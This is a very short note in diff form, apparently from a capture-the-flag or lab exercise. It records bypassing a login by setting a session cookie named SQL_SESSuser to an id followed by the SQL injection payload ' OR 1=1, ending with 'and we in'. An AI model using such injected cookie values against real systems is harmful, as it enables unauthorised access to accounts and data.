@@ -1,0 +1,7 @@
+SQL_SESSuser cookie had some id
+
+set it to
+
+342423961827' OR 1=1
+
+and we in
